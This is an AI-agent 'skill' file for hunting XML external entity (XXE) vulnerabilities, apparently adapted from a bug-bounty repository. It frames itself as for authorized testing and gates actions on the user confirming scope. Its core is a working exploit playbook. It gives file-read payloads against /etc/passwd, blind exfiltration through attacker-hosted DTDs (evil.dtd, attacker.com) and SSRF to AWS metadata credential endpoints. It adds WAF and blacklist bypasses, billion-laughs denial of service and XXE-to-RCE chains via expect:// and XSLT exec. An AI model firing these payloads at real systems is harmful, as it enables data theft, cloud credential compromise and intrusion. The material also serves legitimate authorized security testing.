---
name: hunt-xxe
description: Hunting skill for xxe vulnerabilities.
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: github, hackerone_public, assetnote_research, splunk_security
report_count: 10
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## Crown Jewel Targets

XXE is a critical-severity vulnerability that consistently pays at the top of bug bounty scales ($5,000–$30,000+) due to its direct path to sensitive data exfiltration and SSRF. Highest-value targets:

- **Large enterprise platforms** with XML-heavy backend integrations (finance, logistics, ride-sharing APIs)
- **Domains with file-read capability** — `/etc/passwd`, `/etc/shadow`, internal config files, AWS metadata endpoints
- **Subdomains sharing backend infrastructure** — one XXE endpoint can pivot to internal services across dozens of domains (as demonstrated by 26+ Uber domains via a single entry point)
- **API gateways** accepting XML content types — especially REST APIs that silently accept `Content-Type: application/xml`
- **File upload features** — SVG, DOCX, XLSX, PDF, PPTX parsers on the server side
- **SAML/SSO endpoints** — SAML assertions are XML-based and frequently vulnerable
- **Office/document processing services** — any feature that converts or processes user-supplied documents

---

## Attack Surface Signals

### URL Patterns
```
/api/v*/xml
/upload
/import
/parse
/convert
/saml/acs
/sso/saml
/feed
/rss
/sitemap
/webdav
/soap/*
/wsdl
/service.asmx
/xmlrpc
/graphql (multipart with XML)
```

### Request/Response Headers
```
Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/soap+xml
Content-Type: multipart/form-data  ← check file upload fields
Accept: application/xml
X-Content-Type-Options: (absent — good sign of loose parsing)
```

### JavaScript Patterns (source recon)
```javascript
// Look for in JS bundles
XMLSerializer
DOMParser
parseFromString
new ActiveXObject("Microsoft.XMLDOM")
$.parseXML(
xml2js
libxmljs
lxml
```

### Tech Stack Signals
- **Java stacks**: Spring, Struts, JAX-WS — default XML parsers (SAX, DOM) are XXE-vulnerable without explicit hardening
- **PHP**: `simplexml_load_string()`, `DOMDocument::loadXML()` — vulnerable by default pre-PHP 8
- **Python**: `lxml`, `xml.etree` (safe by default), `xml.sax` (unsafe)
- **Ruby**: `Nokogiri` older versions, `REXML`
- **Node.js**: `xml2js`, `libxmljs`, `fast-xml-parser` (older versions)
- **WSDL/SOAP services**: Always test — legacy XML parsing virtually guaranteed
- **File parsers**: Apache POI (Java), python-docx, LibreOffice integrations

---

## Step-by-Step Hunting Methodology

1. **Map every XML entry point** — Use Burp Suite passive scanner to flag all requests/responses with XML content types. Also intercept JSON endpoints and manually swap `Content-Type` to `application/xml` with equivalent XML body.

2. **Identify file upload features** — Upload SVG, DOCX, XLSX, and observe if the server processes/renders content. These are often XML under the hood.

3. **Attempt inline XXE (classic file read)** — Replace the XML body with a basic entity test payload targeting `/etc/passwd` or `C:\Windows\win.ini`. Observe if the value is reflected in the response.

4. **If no reflection, pivot to Blind OOB** — Set up an OOB listener (Burp Collaborator, interactsh, or a self-hosted netcat server). Inject an external entity pointing to your callback URL. Confirm DNS/HTTP hit to validate the parser is making outbound connections.

5. **Escalate Blind OOB to file exfiltration** — Use a two-stage payload: first entity loads local file, second entity sends it OOB via HTTP parameter or DNS exfiltration.

6. **Test SSRF pivot** — Point the external entity at internal network addresses (`http://169.254.169.254/latest/meta-data/`, `http://10.0.0.1/`, `http://localhost:8080/admin`). Look for differences in response timing or error messages.

7. **Test all subdomains sharing the same backend** — If one subdomain is vulnerable, enumerate and test all others systematically. Shared backend infrastructure means shared vulnerability.

8. **Test parameter-level injection** — Some endpoints parse only specific XML nodes. Inject entities into every element value, attribute value, and even element names.

9. **Test for error-based exfiltration** — If OOB is blocked, trigger XML parsing errors that include file content in the error message returned to the client.

10. **Document the full impact chain** — Demonstrate: file read → SSRF → internal service access → note which internal domains/IPs are reachable.

---

## Payload & Detection Patterns

### Error-based exfil via local-DTD repurposing (zero network egress)
When both `file://` outbound AND external-DTD fetch are blocked, reference a DTD already on disk and redefine one of its internal entities so the target file content leaks in the parse error:
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexist/%file;&#x27;>">
    %eval; %err;'>
  %local_dtd; ]>
```
Needs zero network egress. Local DTD paths differ per distro (yelp/docbookx is common) — enumerate. (PortSwigger: XXE by repurposing a local DTD.)

### Classic In-Band File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

### Windows Equivalent
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root><data>&xxe;</data></root>
```

### Blind OOB — DNS/HTTP Callback
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR.BURPCOLLABORATOR.net/xxe-test">
]>
<root><data>&xxe;</data></root>
```

### Blind OOB — File Exfiltration via Parameter Entity (two-stage)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">
  %dtd;
]>
<root><data>trigger</data></root>
```

**evil.dtd (hosted on attacker server):**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%all;
```

### SSRF via XXE (AWS Metadata)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&ssrf;</data></root>
```

### SVG XXE (for file upload endpoints)
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="14" x="0" y="16">&xxe;</text>
</svg>
```

### DOCX/XLSX XXE — Inject into `[Content_Types].xml` or `word/document.xml`
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Types xmlns="..."><Default Extension="rels" ContentType="&xxe;"/></Types>
```

### Content-Type Swap (JSON to XML)
```bash
# Original JSON request
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"user":"test"}'

# Converted to XML for XXE testing
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.net">]><user>&xxe;</user>'
```

### Grep Patterns for Source Code Review
```bash
# PHP
grep -rn "simplexml_load_string\|DOMDocument\|xml_parse\|loadXML\|SimpleXMLElement" .

# Java
grep -rn "DocumentBuilder\|SAXParser\|XMLReader\|XMLInputFactory\|TransformerFactory" .

# Python
grep -rn "lxml\|xml.sax\|parseString\|fromstring\|etree.parse" .

# Look for missing hardening
grep -rn "FEATURE_EXTERNAL_GENERAL_ENTITIES\|setExpandEntityReferences\|setFeature.*false" .
```

---

## Common Root Causes

1. **Default parser configurations** — Java's `DocumentBuilderFactory`, PHP's `DOMDocument`, and Python's `lxml` all support external entities by default. Developers use them without reading the security docs.

2. **Framework upgrades without security re-review** — Older versions of Spring, Struts, and similar frameworks enabled XXE by default; developers didn't re-audit XML handling when libraries changed.

3. **Hidden XML consumption** — Developers accept JSON at the API layer but convert to XML internally, or use libraries (Apache POI, python-docx) to process uploads without realizing those formats are XML containers.

4. **Copy-paste code from StackOverflow** — XML parsing examples online rarely include entity disabling. Developers copy minimal working examples straight into production.

5. **SAML/SSO library misconfigurations** — SSO integrations often delegate XML parsing to third-party libraries with XXE enabled; developers assume "library handles security."

6. **Testing gaps on non-primary content types** — QA tests JSON APIs extensively; XML code paths receive minimal security testing because they're secondary or legacy.

7. **Microservice XML messaging** — Internal service-to-service communication uses XML (SOAP, custom schemas) and is treated as a "trusted internal" concern, bypassing security review.

---

## Bypass Techniques

### Defense: Keyword blacklist (`ENTITY`, `DOCTYPE`, `SYSTEM`)
```xml
<!-- Case variation -->
<!DoCtYpE foo [<!EnTiTy xxe SyStEm "file:///etc/passwd">]>

<!-- Encoding bypass -->
<?xml version="1.0" encoding="UTF-16"?>
(submit the entire payload UTF-16 encoded)

<!-- Parameter entity instead of general entity -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe;]>
```

### Defense: External entity fetching disabled (file:// blocked)
```xml
<!-- Try alternative URI schemes -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">       <!-- Java -->
<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/">   <!-- Java -->
<!ENTITY xxe SYSTEM "gopher://internal-service:80/_GET%20/">
```

### Defense: WAF blocking XXE patterns
```xml
<!-- Chunked transfer encoding to bypass WAF inspection -->
Transfer-Encoding: chunked

<!-- HTTP request splitting with XML payload spread across chunks -->

<!-- Use XML comments to break signatures -->
<!-–- -->DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- Nested encoding -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6c;&#x65;:///etc/passwd">]>
```

### Defense: Network egress filtering (OOB blocked)
```xml
<!-- DNS-only exfiltration (port 53 often allowed) -->
<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://%data;.attacker.com/'>">

<!-- Error-based exfiltration (no outbound needed) -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///notexist/%file;'>">
  %eval; %error;
]>
```

### Defense: Content-Type validation
```
# Try mismatched Content-Type headers
Content-Type: application/json; charset=xml
Content-Type: application/xml+json
# Or simply omit Content-Type and let the server sniff
```

### Defense: Input length limits
```xml
<!-- Use billion laughs to test parser limits, and use short file paths -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;">
]>
<!-- Escalate to demonstrate DoS if XXE file-read is patched -->
```

---

## Parser-ecosystem vulnerability matrix

XXE classic payloads (`<!ENTITY xxe SYSTEM "file://...">`) are not universally exploitable in 2026. Most mainstream language ecosystems have hardened their default XML parsers since 2018-2024. Fingerprint the target stack BEFORE investing time in XXE — sometimes the parser is already safe and the bug class doesn't apply.

| Ecosystem / parser | Default behavior on SYSTEM entity | Vulnerable by default? |
|---|---|---|
| Java SAX / DOM (`XMLInputFactory` without disabling external entities) | Expands SYSTEM file:// | **YES** |
| Java JAXB / JAX-WS (older Spring versions) | Expands | **YES** |
| PHP `DOMDocument` with `LIBXML_NOENT` flag | Expands SYSTEM | **YES** |
| PHP `simplexml_load_*` with `LIBXML_NOENT` | Expands | **YES** |
| .NET `XmlDocument` with `XmlResolver` explicitly set | Expands | **YES** |
| .NET `XmlReader` with `DtdProcessing=Parse` + `XmlResolver` explicitly set | Expands | **YES** (default since .NET 4.5.2 is `DtdProcessing.Prohibit`, which THROWS on any DOCTYPE — modern default is safe) |
| Python `xml.etree.ElementTree` ≥ 3.7.1 | SYSTEM disabled | NO |
| Python `lxml` (verified 6.x; likely ≥ 5.x) | Drops SYSTEM file content even with `resolve_entities=True`; may still issue network fetches when `no_network=False` | NO for file read (verified locally on 6.1.0 — see `docs/verification/phase2g-saml-mfa-xxe.md`) |
| Python `xml.dom.minidom` | Default safe in current versions | NO |
| Python `defusedxml.lxml` | Disabled | NO |
| Ruby Nokogiri default | Disabled | NO |
| Ruby Nokogiri with `Nokogiri::XML::ParseOptions::DTDLOAD` | Expands | **YES** |
| Apache Struts (older) | Often expands | **YES** |
| Embedded IoT / industrial XML processors (firmware) | Frequently vulnerable | **YES** |
| Microsoft Office OOXML processors that re-parse user content | Vulnerable in some legacy paths | **YES** |

**Fingerprint signals to look for:**

- `Server: Apache Tomcat`, `X-Powered-By: Servlet` → Java backend → **likely YES**
- `X-Powered-By: PHP/...` + endpoint that ingests XML → **likely YES** if app uses `DOMDocument`
- `Server: Microsoft-IIS` with `.aspx` and XML SOAP → **likely YES** on legacy code
- Server says nothing identifiable + endpoint accepts XML → **probe with `&hello;` first**; if the inline entity expands, escalate to SYSTEM. If the inline entity also fails to expand, the parser may be hardened — pivot.

**Pre-Severity Gate:** before claiming XXE on a candidate endpoint, run the inline-entity probe (`<!ENTITY hello "world!">` then `&hello;` in a node). If `hello!` does NOT echo back, parser-level entity expansion is disabled and SYSTEM file:// won't work either. Don't waste cycles on a hardened parser.

---

## Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   - Can you show the contents of `/etc/passwd` or `win.ini` in the response? OR can you demonstrate a confirmed OOB callback with a file's contents transmitted to your server? OR can you reach an internal SSRF endpoint (metadata, internal admin)?

2. **What does the victim LOSE?**
   - Specific sensitive data must be identified: internal credentials, AWS IAM keys, application config files with DB passwords, PII, or internal network topology. "Parser made a DNS request" alone is insufficient — escalate to demonstrate actual data exposure or internal access.

3. **Can it be reproduced in 10 minutes from scratch?**
   - You must have a single `curl` command or Burp repeater request that a triage engineer can run against the live target and see the impact within 10 minutes, with zero ambiguity about the vulnerable parameter and endpoint.

---

## Real Impact Examples

### Scenario A: Single Endpoint → 26 Domains Compromised (Uber-scale)
A tester discovered an XML parsing endpoint on one Uber subdomain. The backend processed XML using a vulnerable parser, and the server made outbound HTTP requests to attacker-controlled infrastructure (blind OOB). Because the vulnerable XML processing service was a shared internal microservice, the same vulnerability was reachable through 26+ different public-facing domains — all sharing the backend. A single payload could read `/etc/passwd`, internal config files, and reach AWS metadata endpoints, effectively giving access to credentials reusable across the entire infrastructure.

**Business impact**: Full internal service compromise across the majority of the production domain fleet; potential for credential theft and lateral movement.

### Scenario B: Document Upload → Local File Read on Twitter-scale Platform
An attacker uploaded a crafted XML-based document (e.g., SVG or Office format) to a document processing feature on a major social platform. The server-side parser processed the embedded DTD and external entity references, returning local file contents in the parsed output or error messages. The attacker could read application config files containing database connection strings, internal API keys, and potentially private user data stored on the same filesystem.

**Business impact**: Exposure of production secrets (database credentials, API keys) via a feature intended for harmless file uploads; no authentication bypass required beyond a standard user account.

### Scenario C: JSON API → Hidden XML Parser → SSRF to Internal Services
A REST API endpoint nominally accepting JSON was found to also parse requests submitted as `application/xml`. The underlying service converted XML to an internal format using an unpatched Java `DocumentBuilderFactory`. By injecting a SYSTEM entity pointing at `http://10.0.0.x` address ranges, the tester could probe internal services, reach an unauthenticated internal admin panel, and retrieve AWS instance metadata including temporary IAM credentials — all through a single API call requiring only a valid session token.

**Business impact**: Complete AWS credential compromise from a single authenticated API call, enabling privilege escalation from application-level user to cloud infrastructure administrator.

---

## Disclosed Report Citations (Backfill +6 — 2016-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Three cases (#7, #9, #10) are OOB-required (blind) — they cross-reference the `hunt-ssrf` OOB-Or-It-Didn't-Happen Gate and cannot be claimed without a Collaborator/interactsh callback.

5. **Mail.ru — Pulse RSS/Atom feed XXE (file read)** ([H1 #505947](https://hackerone.com/reports/505947))
    - Subclass: direct file-read XXE (in-band)
    - Payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` inside RSS feed body → `<title>&xxe;</title>` reflected in response
    - Root cause: pulse.mail.ru RSS/Atom ingestion called an XML parser with `external general entities` enabled
    - Year: 2019 — **$6,000**

6. **Twitter — sms-be-vip.twitter.com SOAP/SXMP servlet XXE** ([H1 #248668](https://hackerone.com/reports/248668))
    - Subclass: SOAP XXE (cloudhopper SXMP servlet) — confirmed via HTTP callback **and** reflected file read
    - Payload: `<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://attacker/x.dtd"> %ext;]>` chained in SXMP request body
    - Root cause: Cloudhopper SXMP servlet parsed inbound XML with default JAXP settings (entities resolved)
    - Year: 2017 — **$10,080** (classic SOAP-XXE reference case)

7. **Zivver — SVG profile-picture upload XXE → SSRF** ([H1 #897244](https://hackerone.com/reports/897244))
    - Subclass: SVG-upload XXE, OOB-confirmed, chains to SSRF
    - Payload: SVG with `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><text>&xxe;</text>`
    - Root cause: server thumbnailed uploaded SVG with an XML parser that resolved external entities; no entity-resolver shutdown
    - Year: 2020 — Zivver had no paid program at the time

8. **Open-Xchange — Blind XXE via PowerPoint (.pptx) import** ([H1 #334488](https://hackerone.com/reports/334488))
    - Subclass: Office-doc XXE (PPTX = ZIP of XML parts), OOB-required
    - Payload: modify `ppt/slides/slide1.xml` inside the .pptx ZIP to include `<!DOCTYPE x [<!ENTITY % a SYSTEM "http://attacker/d.dtd"> %a;]>`; external DTD chains parameter entities to exfil `file:///etc/passwd` over HTTP
    - Root cause: PowerPoint parser pre-rendered the XML parts of the OOXML container before disabling entity resolution
    - Year: 2018 — **$2,000**

9. **Uber — Blind OOB XXE on ubermovement.com** ([H1 #154096](https://hackerone.com/reports/154096))
    - Subclass: blind OOB XXE (third-party vendor product), OOB-required
    - Payload: `<!DOCTYPE r [<!ENTITY ping SYSTEM "http://attacker.example/">]><search><q>&ping;</q></search>`
    - Root cause: generic XML endpoint in Movement's vendor stack accepted XML and resolved system entities; no data exfil possible (sandboxed), only blind ping
    - Year: 2016 — **$500**

10. **Adobe Commerce / Magento — "CosmicSting" CVE-2024-34102** ([Assetnote writeup](https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102))
    - Subclass: XXE-to-RCE (nested deserialization → XXE in Laminas request body) — modern, exploited in the wild
    - Payload: REST API JSON request whose nested `simplexml_load_string()` reaches `<!DOCTYPE r [<!ENTITY % d SYSTEM "http://attacker/x.dtd"> %d;]>`; external DTD reads `app/etc/env.php` (admin crypt-key) and POSTs it back; key forges admin token → RCE
    - Root cause: `Laminas\Http\PhpEnvironment\Request` deserialized `simplexml_load_string` on attacker-controlled body without `LIBXML_NOENT` protections
    - Year: 2024 — Adobe HackerOne bounty paid, CVSS 9.8

---

## Related Skills & Chains

- **`hunt-ssrf`** — XXE is SSRF-with-XML-syntax once you discover the parser fetches external entities. Chain primitive: blind XXE OOB `<!ENTITY % x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role">` → exfil AWS IMDS creds via parameter-entity DTD callback → STS AssumeRole chain. Where pure SSRF is filter-blocked, `gopher://` via XXE-in-`libxml2` can still reach Redis/SMTP.
- **`hunt-file-upload`** — XXE most often hides inside file-upload features that quietly parse XML (DOCX/XLSX/PPTX, SVG, GPX, KML, OOXML, SOAP attachments). Chain primitive: upload DOCX with malicious `[Content_Types].xml` containing parameter-entity DTD → OOB file read of `/etc/passwd` / `web.config` / `.aws/credentials` via the document parser running server-side.
- **`hunt-rce`** — XXE → RCE is rare but real on PHP (`expect://`), Java (XSLT extensions with `<xsl:script>`/Xalan), and older XmlSpy/SAXON deployments. Chain primitive: XXE in a Java endpoint using a vulnerable XSLT processor → `<xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>` → RCE; or PHP XXE with `expect://id` stream wrapper enabled → direct RCE.
- **`hunt-sharepoint`** — On-prem SharePoint/Exchange/IIS stacks have a long history of XXE in SOAP/CSOM/EWS endpoints. Chain primitive: anonymous XXE in `_vti_bin/*.asmx` or EWS SOAP → read `web.config` → recover `<machineKey>` → ViewState deserialization → RCE (the ToolShell-adjacent precondition).
- **`security-arsenal`** — Reach for the XXE payload tree: standard SYSTEM file read, parameter-entity OOB DTD pattern (the `%` indirection that makes blind XXE work), `php://filter/convert.base64-encode/resource=` for binary-safe read, XInclude (`<xi:include href=...>`) when DOCTYPE is blocked, billion-laughs/quadratic-blowup for DoS, and the `jar://` / `netdoc://` Java-specific wrappers.
- **`triage-validation`** — Apply the Reproducibility + Pre-Severity Gates. An XXE that only triggers an OOB DNS callback with NO data exfil is Low/Medium (information disclosure of "this parser fetches entities"), not Critical. Critical needs proof of file read or internal HTTP — show the actual `/etc/passwd` content or the IMDS JSON response in the report.

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
